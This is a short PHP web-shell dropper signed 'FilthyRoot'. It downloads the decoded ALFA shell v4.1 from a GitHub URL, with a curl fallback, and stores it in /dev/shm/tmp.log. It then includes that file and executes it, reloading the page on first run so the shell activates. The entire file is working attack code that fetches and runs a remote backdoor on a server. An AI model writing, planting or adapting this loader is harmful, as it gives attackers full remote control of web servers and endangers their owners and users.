<?php
// author : FilthyRoot

$link = "https://raw.githubusercontent.com/Ravin-Academy/DeObfuscation_ALFA_SHELL_V4.1/main/Decode%20Of%20ALFA%20Team/alfa-shell-v4.1-tesla-decoded.php";
function get_content(){
	global $link;
	if(strlen(file_get_contents($link)) !== 0){
		$content = file_get_contents($link);
	}else{
		$ch = curl_init();

		curl_setopt($ch, CURLOPT_URL, 'https://raw.githubusercontent.com/Ravin-Academy/DeObfuscation_ALFA_SHELL_V4.1/main/Decode%20Of%20ALFA%20Team/alfa-shell-v4.1-tesla-decoded.php');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

		$result = curl_exec($ch);
		if (curl_errno($ch)) {
		    echo 'Error:' . curl_error($ch);
		}
		curl_close($ch);
		$content = $result;
	}
	return $content;

}
function writer(){
	$content = get_content();
	if(file_put_contents('/dev/shm/tmp.log', $content)){
		return True;
	}else{
		$fh = fopen('/dev/shm/tmp.log', "w");
		if(fwrite($fh, $content)){
			fclose($fh);
			return True;
		}else{
			return False;
		}
	}
}

if(filesize('/dev/shm/tmp.log')){
	include '/dev/shm/tmp.log';
	die();
}else{
	writer();
	echo "<script>window.location.reload();</script>";
	die();
}
?>